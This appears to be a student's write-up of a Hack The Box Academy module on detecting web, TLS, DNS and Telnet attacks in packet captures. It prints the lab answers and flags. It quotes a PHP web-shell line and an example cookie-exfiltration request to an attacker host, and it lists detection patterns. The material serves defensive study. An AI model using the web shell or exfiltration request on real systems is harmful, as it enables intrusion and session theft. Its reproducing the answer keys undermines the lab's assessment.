**Q11** Inspect the CRLF\_and\_host\_header\_manipulation.pcapng file, part of this module's resources, and enter the total number of HTTP packets with response code 400 as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FcNZgZVRzTCKZdbAzhdPn%2FScreenshot%202025-09-15%20at%2010.51.49%E2%80%AFPM.png?alt=media&#x26;token=ccd261ba-64dd-45c8-86fc-3c2da2df161b" alt=""><figcaption></figcaption></figure>

**Answer : 7**



## Cross-Site Scripting (XSS) & Code Injection Detection

### Related PCAP File(s)

* `XSS_Simple.pcapng`

***

### Overview

* **Cross-Site Scripting (XSS)**: attacker injects malicious JavaScript (or other script) into web pages viewed by other users. When victims load the page, the injected script executes in their browser context and can steal cookies, tokens, or perform actions as the victim.
* **Code injection (e.g., PHP injection)**: attacker supplies input that the server interprets and executes as code (command execution, backdoor upload, etc.).
* Both types of issues are often preceded by web-based reconnaissance and may appear in HTTP traffic or server logs. PCAP captures may reveal exfiltration attempts (HTTP requests out to attacker-controlled hosts) or suspicious payloads in HTTP requests.

***

### Typical Attack Flow (high level)

1. Attacker finds an input vector (comment field, form, query parameter, etc.).
2. Attacker injects JavaScript / payload into that input.
3. When another user views the page, their browser executes the injected script.
4. The script sends stolen data (e.g., `document.cookie`) to an attacker-controlled endpoint (exfiltration via HTTP GET/POST).
5. Alternatively, code injection on the server (e.g., `<?php system($_GET['cmd']); ?>`) allows remote command execution.

***

### Indicators & What to Look For in a PCAP

* **Unusual outbound HTTP requests** from internal hosts to external IPs containing parameters that look like cookies, tokens, or encoded blobs.
  * Example: `GET http://attacker:5555/?cookie=<encoded_cookie>`
* **Repeated HTTP requests** that include session cookies or tokens in query strings.
* **HTTP requests to unfamiliar internal hosts** (internal server acting as collector).
* **Encoded/URL-encoded payloads** in request parameters that, when decoded, reveal `document.cookie`, `XMLHttpRequest`, or suspicious script fragments.
* **404/200 pairs** where an injected path results in subsequent requests using stolen tokens (indicates successful theft/use).
* **Presence of script tags** or suspicious payloads in POST bodies or query strings (HTML/JS code visible in packet payload).
* **Unexpected application responses** after suspicious inputs (e.g., shell output returned in HTTP response).

### ractical Investigation (Wireshark / tshark / tcpdump)

#### Wireshark

* Filter for HTTP traffic:

```
http
```

* Find HTTP requests containing likely exfil strings (cookies, token, `document.cookie`, `XMLHttpRequest`):
* Show requests to suspicious external IPs or ports:

```
http && ip.dst == 192.168.0.19 && tcp.dstport == 5555
```

* Follow suspicious HTTP stream to view full request/response payloads: Right-click → **Follow** → **HTTP Stream**.

### Detection Heuristics & Rules

* Alert on **HTTP requests with query parameters containing cookie values** (`?cookie=`, `?session=`, etc.).
* Alert on **requests to external hosts that contain internal session identifiers**.
* Alert on **frame contains "\<script"** or suspicious HTML/JS within HTTP payloads.
* Flag origin pages that include `<script>` or suspicious payloads submitted by unauthenticated or low-privilege users.
* Baseline normal application behavior (which pages should never include user-supplied HTML) and alert on deviations.

### Summary Key

* XSS & code injection can be detected in PCAPs by spotting **HTTP requests containing scripts**, **requests carrying cookies/tokens to attacker hosts**, and **unexpected outbound traffic**.
* Quick detection techniques: Wireshark filters for `document.cookie`, `frame contains "<script"`, large numbers of requests to external hosts with tokens.
* Prevent with input sanitization, HttpOnly cookies, CSP, WAF, and endpoint hardening — plus rapid incident response (contain, rotate, patch).

**Q12** Inspect the first packet of the XSS\_Simple.pcapng file, part of this module's resources, and enter the cookie value that was exfiltrated as your answer.

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2Fc72dwPuER8da3hDQwYfa%2FScreenshot%202025-09-15%20at%2010.54.51%E2%80%AFPM.png?alt=media&#x26;token=5213926e-7616-43c3-8991-f9cbf07b7af3" alt=""><figcaption></figcaption></figure>

**Answer : mZjQ17NLXY8ZNBbJCS0O**





## SSL Renegotiation Attacks

**Related PCAP File(s):**

* `SSL_renegotiation_edited.pcapng`

***

### Overview

While HTTP traffic is unencrypted, HTTPs uses **SSL/TLS encryption** to secure communication between clients and servers. However, encrypted traffic can also be exploited through attacks such as **SSL Renegotiation**.

***

### HTTPS Breakdown

HTTPS adds encryption and authentication layers on top of HTTP:

1. **Transport Layer Security (TLS)**
2. **Secure Sockets Layer (SSL)**

#### Connection Establishment Steps

* **Handshake** – Client and server agree on encryption algorithms and exchange certificates.
* **Encryption** – Both sides begin using the agreed-upon algorithm for secure data.
* **Data Exchange** – Pages, images, and resources are exchanged over the encrypted channel.
* **Decryption** – Data is decrypted with private and public keys.

***

### Common HTTPS Attacks

* **SSL Renegotiation** – Attacker forces repeated renegotiations, often downgrading encryption.
* **Heartbleed Vulnerability (CVE-2014-0160)** – Exploits OpenSSL heartbeat to leak memory.

***

### TLS/SSL Handshake Process

#### General Steps

1. **Client Hello** – Client proposes supported TLS/SSL versions, cipher suites, and random nonce.
2. **Server Hello** – Server chooses protocol version, cipher suite, and provides a nonce.
3. **Certificate Exchange** – Server sends digital certificate (with public key).
4. **Key Exchange** – Client generates a premaster secret, encrypts with server’s public key.
5. **Session Key Derivation** – Both derive session keys using nonces and the premaster secret.
6. **Finished Messages** – Exchanged to verify both parties derived the same keys.
7. **Secure Data Exchange** – Encrypted communication begins.

#### Algorithmic Breakdown

| Step                       | Calculation                                                           |
| -------------------------- | --------------------------------------------------------------------- |
| **Client Hello**           | `{ ClientVersion, ClientRandom, Ciphersuites, CompressionMethods }`   |
| **Server Hello**           | `{ ServerVersion, ServerRandom, Ciphersuite, CompressionMethod }`     |
| **Certificate**            | `{ ServerPublicCertificate }`                                         |
| **Key Exchange**           | `Client/Server DHPublicKey`, `PremasterSecret = DH_KeyAgreement(...)` |
| **Session Key Derivation** | `MasterSecret = PRF(PremasterSecret, …)`                              |
| **Extraction of Keys**     | Client/Server MAC keys, encryption keys, IVs                          |
| **Finished Messages**      | `PRF(MasterSecret, "finished", Hash(ClientHello + ServerHello))`      |

***

### Detecting SSL Renegotiation Attacks

**Wireshark Filter:** ssl.record.content\_type == 22

(Content type `22` = handshake messages only)

#### Indicators in Traffic Analysis

* **Multiple Client Hellos** – Same client repeatedly sends hello within short timeframe.
* **Out of Order Messages** – Client Hello seen after handshake completion.

***

### Attacker Objectives

1. **Denial of Service (DoS)** – Exhaust server resources by repeated renegotiations.
2. **SSL/TLS Weakness Exploitation** – Downgrade to weaker cipher suites for easier compromise.
3. **Cryptanalysis** – Gather handshake data for analysis of TLS/SSL implementation weaknesses.

Inspect the SSL\_renegotiation\_edited.pcapng file, part of this module's resources, and enter the total count of "Client Hello" requests as your answer.

\*Im forgot captured  wireshark\*

**Answer : 16**



## Peculiar DNS Traffic

**Related PCAP File(s):**

* `dns_enum_detection.pcapng`
* `dns_tunneling.pcapng`

***

### Overview

DNS traffic can be overwhelming due to high volume, but recognizing anomalies is critical for network traffic analysis.

***

### DNS Queries

#### Forward Lookups

* Used to resolve domain names to IP addresses.
* Typical flow:
  1. **Query Initiation** – Client requests a domain (e.g., `academy.hackthebox.com`).
  2. **Local Cache Check** – Check DNS cache; if not present, proceed.
  3. **Recursive Query** – Send query to configured DNS server.
  4. **Root Servers** – Resolver queries root servers for authoritative TLD servers.
  5. **TLD Servers** – Root server responds with authoritative TLD server.
  6. **Authoritative Servers** – Resolver queries domain’s authoritative server.
  7. **Response** – Resolver returns IP (A or AAAA record) to client.

#### Reverse Lookups

* Used to resolve IP addresses to FQDNs.
* Steps:
  1. **Query Initiation** – Client sends reverse query to DNS resolver.
  2. **Reverse Lookup Zones** – Resolver checks authoritative reverse zone.
  3. **PTR Record Query** – Resolver searches PTR record.
  4. **Response** – Resolver returns FQDN of IP address.

***

### DNS Record Types

| Type  | Description                |
| ----- | -------------------------- |
| A     | IPv4 address               |
| AAAA  | IPv6 address               |
| CNAME | Alias for domain           |
| MX    | Mail server for domain     |
| NS    | Authoritative name server  |
| PTR   | Pointer for reverse lookup |
| TXT   | Text data for domain       |
| SOA   | Administrative zone info   |

***

### Detecting DNS Enumeration

* Significant DNS traffic from a single host may indicate enumeration.
* Look for **ANY queries** in Wireshark

#### Attack Purposes

1. **Data Exfiltration** – Transfer sensitive data covertly.
2. **Command and Control (C2)** – Malware uses DNS tunnels to communicate with C2 servers.
3. **Bypass Firewalls/Proxies** – DNS is often allowed through network boundaries.
4. **Domain Generation Algorithms (DGAs)** – Malware generates dynamic domains to avoid detection.

**Q13** Enter the decoded value of the triple base64-encoded string that was mentioned in this section as your answer. Answer format: HTB{\_\_\_}

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FhsXk0MpsgZBouEkGoGQL%2FScreenshot%202025-09-15%20at%2011.11.17%E2%80%AFPM.png?alt=media&#x26;token=9d2c42eb-8a5e-4d95-b18f-507d310e2d82" alt=""><figcaption></figcaption></figure>

**Answer : HTB{Would\_you\_forward\_me\_this\_pretty\_please}**



## Strange Telnet & UDP Connections

**Related PCAP File(s):**

* `telnet_tunneling_23.pcapng`
* `telnet_tunneling_9999.pcapng`
* `telnet_tunneling_ipv6.pcapng`
* `udp_tunneling.pcapng`

***

### Overview

Telnet and UDP traffic can reveal unusual or malicious activity often overlooked in network analysis.

***

### Telnet

#### Definition

* Telnet is a protocol for bidirectional interactive communication over a network (RFC 854).
* Usage has declined in favor of SSH, but older systems may still rely on Telnet for remote command and control.
* Attackers may exploit Telnet for **data exfiltration** or **tunneling**.

#### Traditional Telnet on Port 23

* **Filter in Wireshark for Telnet: tcp.port == 23**
* Telnet traffic is usually unencrypted, but attackers may encode/obfuscate data.

#### Unrecognized Telnet on Non-Standard Ports

* Telnet traffic can appear on unusual ports (e.g., 9999).
* Follow TCP streams to inspect data for potential exfiltration:

#### Telnet over IPv6

* IPv6 Telnet traffic may indicate suspicious activity in networks not configured for IPv6.
* Wireshark filter for specific IPv6 Telnet:

**Q14** Inspect the telnet\_tunneling\_ipv6.pcapng file, part of this module's resources, and enter the hidden flag as your answer. Answer format: HTB(\_\_\_) (Replace all spaces with underscores)

<figure><img src="https://97192284-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FgJzvqFCnTpw25MQy2FcH%2Fuploads%2FiUT6EwjEgNAqByhVKZFN%2FScreenshot%202025-09-15%20at%2011.13.56%E2%80%AFPM.png?alt=media&#x26;token=d99343a0-b374-4c81-af00-48c54f58d652" alt=""><figcaption></figcaption></figure>

**Answer : HTB(Ipv6\_is\_my\_best\_friend)**



## Skills Assessment

As a Security Operations Center (SOC) analyst, you were recently provided with two PCAP (Packet Capture) files named `funky_dns.pcap` and `funky_icmp.pcap`.

Inspect the `funky_dns.pcap` and `funky_icmp.pcap` files, part of this module's resources, to identify if there are certain patterns and behaviors within these captures that deviate from what is typically observed in routine network traffic. Then, answer the questions below.

Inspect the funky\_dns.pcap file, part of this module's resources, and enter the related attack as your answer. Answer format: "DNS Flooding", "DNS Amplification", "DNS Tunneling"

**Answer : DNS Tunneling**

Inspect the funky\_icmp.pcap file, part of this module's resources, and enter the related attack as your answer. Answer format: "ICMP Flooding", "ICMP Tunneling", "ICMP SMURF Attack"

**Answer : ICMP Tunneling**



[**https://academy.hackthebox.com/achievement/2064122/229**](https://academy.hackthebox.com/achievement/2064122/229)
